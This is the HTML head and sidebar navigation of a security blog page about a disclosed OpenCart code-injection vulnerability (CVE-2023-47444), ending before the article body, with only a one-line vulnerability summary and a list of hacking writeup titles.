<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <link rel="stylesheet" href="/assets/css/just-the-docs-head-nav.css" id="jtd-head-nav-stylesheet"> <style id="jtd-nav-activation"> .site-nav > ul:nth-of-type(3) > li > a, .site-nav > ul:nth-of-type(3) > li > ul > li:not(:nth-child(1)) > a, .site-nav > ul:nth-of-type(3) > li > ul > li > ul > li > a { background-image: none; } .site-nav > ul:not(:nth-of-type(3)) a, .site-nav li.external a { background-image: none; } .site-nav > ul:nth-of-type(3) > li:nth-child(2) > ul > li:nth-child(1) > a { font-weight: 600; text-decoration: none; } .site-nav > ul.nav-category-list > li > button svg, .site-nav > ul:nth-of-type(3) > li:nth-child(2) > button svg, .site-nav > ul:nth-of-type(3) > li:nth-child(2) > ul > li:nth-child(1) > button svg { transform: rotate(-90deg); } .site-nav > ul.nav-category-list > li.nav-list-item > ul.nav-list, .site-nav > ul:nth-of-type(3) > li.nav-list-item:nth-child(2) > ul.nav-list, .site-nav > ul:nth-of-type(3) > li.nav-list-item:nth-child(2) > ul.nav-list > li.nav-list-item:nth-child(1) > ul.nav-list { display: block; } </style> <script src="/assets/js/vendor/lunr.min.js"></script> <script src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <link rel="icon" href="/favicon.ico" type="image/x-icon"> <!-- Begin Jekyll SEO tag v2.8.0 --> <title>Authenticated Static Code Injections in OpenCart (CVE-2023-47444) | 0xbro</title> <meta name="generator" content="Jekyll v4.2.2" /> <meta property="og:title" content="Authenticated Static Code Injections in OpenCart (CVE-2023-47444)" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server." /> <meta property="og:description" content="In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server." /> <link rel="canonical" href="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/" /> <meta property="og:url" content="https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/" /> <meta property="og:site_name" content="0xbro" /> <meta property="og:image" content="https://0xbro.red/assets/images/disclosures/opencart-rce-CVE-2023-47444/storage-rce.png" /> <meta property="og:type" content="article" /> <meta property="article:published_time" content="2023-11-14T00:00:00+00:00" /> <meta name="twitter:card" content="summary_large_image" /> <meta property="twitter:image" content="https://0xbro.red/assets/images/disclosures/opencart-rce-CVE-2023-47444/storage-rce.png" /> <meta property="twitter:title" content="Authenticated Static Code Injections in OpenCart (CVE-2023-47444)" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-11-14T00:00:00+00:00","datePublished":"2023-11-14T00:00:00+00:00","description":"In OpenCart versions 4.0.0.0 to 4.0.2.3, authenticated backend users having common/security access and modify privileges can write arbitrary untrusted data inside config.php and admin/config.php, resulting in remote code execution on the underlying server.","headline":"Authenticated Static Code Injections in OpenCart (CVE-2023-47444)","image":"https://0xbro.red/assets/images/disclosures/opencart-rce-CVE-2023-47444/storage-rce.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://0xbro.red/assets/images/0xbro_minimal1.png"}},"url":"https://0xbro.red/disclosures/disclosed-vulnerabilities/opencart-CVE-2023-47444/"}</script> <!-- End Jekyll SEO tag --> <link type="application/atom+xml" rel="alternate" href="https://0xbro.red/" title="0xbro" /> </head> <body> <a class="skip-to-main" href="#main-content">Skip to main content</a> <svg xmlns="http://www.w3.org/2000/svg" class="d-none"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <!-- Feather. MIT License: https://github.com/feathericons/feather/blob/master/LICENSE --> <symbol id="svg-external-link" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-external-link"> <title id="svg-external-link-title">(external link)</title> <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><polyline points="15 3 21 3 21 9"></polyline><line x1="10" y1="14" x2="21" y2="3"></line> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <!-- Bootstrap Icons. MIT License: https://github.com/twbs/icons/blob/main/LICENSE.md --> <symbol id="svg-copy" viewBox="0 0 16 16"> <title>Copy</title> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16"> <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/> <path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/> </svg> </symbol> <symbol id="svg-copied" viewBox="0 0 16 16"> <title>Copied</title> <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-clipboard-check-fill" viewBox="0 0 16 16"> <path d="M6.5 0A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3Zm3 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3Z"/> <path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1A2.5 2.5 0 0 1 9.5 5h-3A2.5 2.5 0 0 1 4 2.5v-1Zm6.854 7.354-3 3a.5.5 0 0 1-.708 0l-1.5-1.5a.5.5 0 0 1 .708-.708L7.5 10.793l2.646-2.647a.5.5 0 0 1 .708.708Z"/> </svg> </symbol> <!-- Custom icons from https://icons.getbootstrap.com/icons/ --> <symbol id="icon-youtube" viewBox="0 0 16 16"> <path d="M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z"/> </symbol> <symbol id="icon-youtube-color" viewBox="0 0 16 16"> <path fill="#ff0000" d="M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z"/> </symbol> <symbol id="icon-linkedin" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-linkedin"> <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z"/> </svg> </symbol> <symbol id="icon-linkedin-color" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="#0e76a8" class="bi bi-linkedin"> <path d="M0 1.146C0 .513.526 0 1.175 0h13.65C15.474 0 16 .513 16 1.146v13.708c0 .633-.526 1.146-1.175 1.146H1.175C.526 16 0 15.487 0 14.854V1.146zm4.943 12.248V6.169H2.542v7.225h2.401zm-1.2-8.212c.837 0 1.358-.554 1.358-1.248-.015-.709-.52-1.248-1.342-1.248-.822 0-1.359.54-1.359 1.248 0 .694.521 1.248 1.327 1.248h.016zm4.908 8.212V9.359c0-.216.016-.432.08-.586.173-.431.568-.878 1.232-.878.869 0 1.216.662 1.216 1.634v3.865h2.401V9.25c0-2.22-1.184-3.252-2.764-3.252-1.274 0-1.845.7-2.165 1.193v.025h-.016a5.54 5.54 0 0 1 .016-.025V6.169h-2.4c.03.678 0 7.225 0 7.225h2.4z"/> </svg> </symbol> <symbol id="icon-twitter" viewBox="0 0 16 16"> <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/> </symbol> <symbol id="icon-twitter-color" viewBox="0 0 16 16"> <path fill="#1DA1F2" d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/> </symbol> <symbol id="icon-facebook" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-facebook"> <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/> </svg> </symbol> <symbol id="icon-facebook-color" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="#4267B2" class="bi bi-facebook"> <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/> </svg> </symbol> <symbol id="icon-rss" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-rss-fill"> <path d="M2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2zm1.5 2.5c5.523 0 10 4.477 10 10a1 1 0 1 1-2 0 8 8 0 0 0-8-8 1 1 0 0 1 0-2zm0 4a6 6 0 0 1 6 6 1 1 0 1 1-2 0 4 4 0 0 0-4-4 1 1 0 0 1 0-2zm.5 7a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"/> </svg> </symbol> <symbol id="icon-rss-color" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="#f26522" class="bi bi-rss-fill"> <path d="M2 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2zm1.5 2.5c5.523 0 10 4.477 10 10a1 1 0 1 1-2 0 8 8 0 0 0-8-8 1 1 0 0 1 0-2zm0 4a6 6 0 0 1 6 6 1 1 0 1 1-2 0 4 4 0 0 0-4-4 1 1 0 0 1 0-2zm.5 7a1.5 1.5 0 1 1 0-3 1.5 1.5 0 0 1 0 3z"/> </svg> </symbol> <symbol id="icon-telegram" viewBox="0 0 16 16" > <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-telegram"> <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"/> </svg> </symbol> <symbol id="icon-telegram-color" viewBox="0 0 16 16" > <svg xmlns="http://www.w3.org/2000/svg" fill="#2aabee" class="bi bi-telegram"> <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"/> </svg> </symbol> <symbol id="icon-mastodon" viewBox="0 0 16 16" > <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-mastodon" > <path d="M11.19 12.195c2.016-.24 3.77-1.475 3.99-2.603.348-1.778.32-4.339.32-4.339 0-3.47-2.286-4.488-2.286-4.488C12.062.238 10.083.017 8.027 0h-.05C5.92.017 3.942.238 2.79.765c0 0-2.285 1.017-2.285 4.488l-.002.662c-.004.64-.007 1.35.011 2.091.083 3.394.626 6.74 3.78 7.57 1.454.383 2.703.463 3.709.408 1.823-.1 2.847-.647 2.847-.647l-.06-1.317s-1.303.41-2.767.36c-1.45-.05-2.98-.156-3.215-1.928a3.614 3.614 0 0 1-.033-.496s1.424.346 3.228.428c1.103.05 2.137-.064 3.188-.189zm1.613-2.47H11.13v-4.08c0-.859-.364-1.295-1.091-1.295-.804 0-1.207.517-1.207 1.541v2.233H7.168V5.89c0-1.024-.403-1.541-1.207-1.541-.727 0-1.091.436-1.091 1.296v4.079H3.197V5.522c0-.859.22-1.541.66-2.046.456-.505 1.052-.764 1.793-.764.856 0 1.504.328 1.933.983L8 4.39l.417-.695c.429-.655 1.077-.983 1.934-.983.74 0 1.336.259 1.791.764.442.505.661 1.187.661 2.046v4.203z"/> </svg> </symbol> <symbol id="icon-mastodon-color" viewBox="0 0 16 16" > <svg xmlns="http://www.w3.org/2000/svg" fill="#6364ff" class="bi bi-mastodon" > <path d="M11.19 12.195c2.016-.24 3.77-1.475 3.99-2.603.348-1.778.32-4.339.32-4.339 0-3.47-2.286-4.488-2.286-4.488C12.062.238 10.083.017 8.027 0h-.05C5.92.017 3.942.238 2.79.765c0 0-2.285 1.017-2.285 4.488l-.002.662c-.004.64-.007 1.35.011 2.091.083 3.394.626 6.74 3.78 7.57 1.454.383 2.703.463 3.709.408 1.823-.1 2.847-.647 2.847-.647l-.06-1.317s-1.303.41-2.767.36c-1.45-.05-2.98-.156-3.215-1.928a3.614 3.614 0 0 1-.033-.496s1.424.346 3.228.428c1.103.05 2.137-.064 3.188-.189zm1.613-2.47H11.13v-4.08c0-.859-.364-1.295-1.091-1.295-.804 0-1.207.517-1.207 1.541v2.233H7.168V5.89c0-1.024-.403-1.541-1.207-1.541-.727 0-1.091.436-1.091 1.296v4.079H3.197V5.522c0-.859.22-1.541.66-2.046.456-.505 1.052-.764 1.793-.764.856 0 1.504.328 1.933.983L8 4.39l.417-.695c.429-.655 1.077-.983 1.934-.983.74 0 1.336.259 1.791.764.442.505.661 1.187.661 2.046v4.203z"/> </svg> </symbol> <symbol id="icon-htb-color" viewBox="0 0 16 16" > <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" fill="currentColor"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <circle cx="512" cy="512" r="512" style="fill:#9fef00"></circle> <path d="M506.5 256.6c2.9-.8 5.9-.7 8.9-.4 3.8.4 7 2.8 10.3 4.6 66.5 38.4 133 76.9 199.6 115.3 6.4 3.2 11.1 10 10.7 17.4v237.7c.2 6.7-4 12.9-9.7 16-67.9 39.2-135.8 78.5-203.7 117.7-6.1 4-14.5 4.1-20.7.3-66.7-38.5-133.3-77-200-115.6-3.3-2-6.9-3.6-9.4-6.6-3.1-3.4-4.7-8-4.5-12.6V392.6c-.2-6.6 4-12.8 9.6-15.9 67.1-38.7 134.1-77.5 201.1-116.2 2.6-1.4 5-3.1 7.8-3.9zm3.9 47.5c-1.5.2-2.8 1-4.1 1.7-46.2 26.7-92.4 53.3-138.5 80.1-5.5 3.1-5.5 12.1.2 15.1 46.3 26.9 92.7 53.6 139.1 80.4 2.9 1.9 6.9 1.9 9.8 0 46.4-26.8 92.8-53.5 139.1-80.4 5.6-3 5.7-12 .1-15.1-46.3-26.8-92.7-53.6-139.1-80.4-1.9-1.3-4.3-1.8-6.6-1.4zM336.5 442.4c-3.5 1.3-5.8 5.1-5.6 8.8v159.9c-.1 3.6 2.1 6.9 5.2 8.5 46.2 26.7 92.3 53.4 138.5 80 5.7 3.5 13.6-1.4 13.2-8v-160c.1-3.3-1.6-6.5-4.4-8.2l-138.6-80.1c-2.4-1.5-5.6-2.2-8.3-.9zm344.8-.1c-4.1 1.9-7.8 4.4-11.8 6.6-42.8 24.7-85.6 49.5-128.4 74.2-3.2 1.6-5.1 5-5 8.6v159.9c-.4 6.6 7.5 11.5 13.2 8.1 46.2-26.7 92.4-53.4 138.5-80 3.1-1.5 5.4-4.9 5.2-8.4V450.5c.1-5.8-6.4-10.4-11.7-8.2z" style="fill:#fff"></path> </g></svg> </symbol> <symbol id="icon-github" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" class="bi bi-github" > <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z"/> </svg> </symbol> <symbol id="icon-github-color" viewBox="0 0 16 16"> <svg xmlns="http://www.w3.org/2000/svg" fill="#333" class="bi bi-github" > <path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z"/> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header" role="banner"> <a href="/" class="site-title lh-tight"> <div class="site-logo" role="img" aria-label="0xbro"></div> </a> <button id="menu-button" class="site-button btn-reset" aria-label="Toggle menu" aria-pressed="false"> <svg viewBox="0 0 24 24" class="icon" aria-hidden="true"><use xlink:href="#svg-menu"></use></svg> </button> </div> <nav aria-label="Main" id="site-nav" class="site-nav"> <ul class="nav-list"><li class="nav-list-item"><a href="/" class="nav-list-link">Home</a></li><li class="nav-list-item"><a href="/about/" class="nav-list-link">About me</a></li><li class="nav-list-item"><a href="/achievements/" class="nav-list-link">Achievements</a></li></ul> <div class="nav-category">Writeups, Articles & Videos</div> <ul class="nav-list"><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in Web Hacking category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/writeups/web-hacking/" class="nav-list-link">Web Hacking</a><ul class="nav-list"><li class="nav-list-item"><a href="/writeups/web-hacking/salesforce-hacking/" class="nav-list-link">Pentesting Salesforce Communities</a></li><li class="nav-list-item"><a href="/writeups/web-hacking/waf-bypass-exploiting-parser-differentials/" class="nav-list-link">WAF bypass and vulnerability chain exploiting parser differentials</a></li><li class="nav-list-item"><a href="/writeups/web-hacking/ssti-in-ejs-app-using-undocumented-features/" class="nav-list-link">Finding SSTI in an EJS app using existing exploits and undocumented features</a></li><li class="nav-list-item"><a href="/writeups/web-hacking/blind-sql-injection-and-arbitrary-deserialization/" class="nav-list-link">Exploit Arbitrary Deserialization through Blind SQL Injection</a></li><li class="nav-list-item"><a href="/writeups/web-hacking/exploit-zip-slip-vulnerability-in-python-tarfile/" class="nav-list-link">Exploit Zip Slip vulnerability in python tarfile</a></li><li class="nav-list-item"><a href="/writeups/web-hacking/bypassing-addslashes-using-format-string-to-get-sql-injection/" class="nav-list-link">Bypassing addslashes() using format string to get SQL Injection</a></li><li class="nav-list-item"><a href="/writeups/web-hacking/pickle-insecure-deserialization/" class="nav-list-link">Pickle Insecure Deserialization</a></li></ul></li><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in Android Hacking category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/writeups/android-hacking/" class="nav-list-link">Android Hacking</a><ul class="nav-list"><li class="nav-list-item"><a href="/writeups/android-hacking/intercept-https-on-non-rooted-devices/" class="nav-list-link">Intercept HTTPS on non-rooted Android devices</a></li><li class="nav-list-item"><a href="/writeups/android-hacking/certificate-pinning-bypass/" class="nav-list-link">Bypass certificate pinning with Frida and Xposed</a></li><li class="nav-list-item"><a href="/writeups/android-hacking/reverse-and-patch-an-easy-apk/" class="nav-list-link">Reverse and patch an easy APK</a></li><li class="nav-list-item"><a href="/writeups/android-hacking/android-pentesting-lab/" class="nav-list-link">How to set up an Android Penetration Testing Lab from scratch</a></li></ul></li><li class="nav-list-item"><button class="nav-list-expander btn-reset" aria-label="toggle items in InfoSec Education category" aria-pressed="false"> <svg viewBox="0 0 24 24" aria-hidden="true"><use xlink:href="#svg-arrow-right"></use></svg> </button><a href="/writeups/infosec-education/" class="nav-list-link">InfoSec Education</a><ul class="nav-list"><li class="nav-list-item"><a href="/writeups/infosec-education/parliamo-di-community-rev3rse-meethack/" class="nav-list-link">Let's talk about community with Meethack Torino</a></li><li class="nav-list-item"><a href="/writeups/infosec-education/come-non-reagire-a-una-resp-discloure/" class="nav-list-link">How NOT to react to a responsible disclosure (CVE-2023-47444)</a></li><li class="nav-list-item"><a href="/writeups/infosec-education/osint-and-geoguessr-ctf/" class="nav-list-link">Getting Started with GeoGuessr and OSINT (UMDCTF 2023)</a></li><li class="nav-list-item"><a href="/writeups/infosec-education/oltre-la-tecnologia_da-programmatore-a-pentester/" class="nav-list-link">0xbro, from developer to pentester (Beyond technology, Ep. 01)</a></li><li class="nav-list-item"><a href="/writeups/infosec-education/taking-effective-notes-for-oscp/" class="nav-list-link">Taking effective notes for CTF, OSCP and other labs</a></li><li class="nav-list-item"><a href="/writeups/infosec-education/best-websites-to-practice-hacking/" class="nav-list-link">The 5 BEST 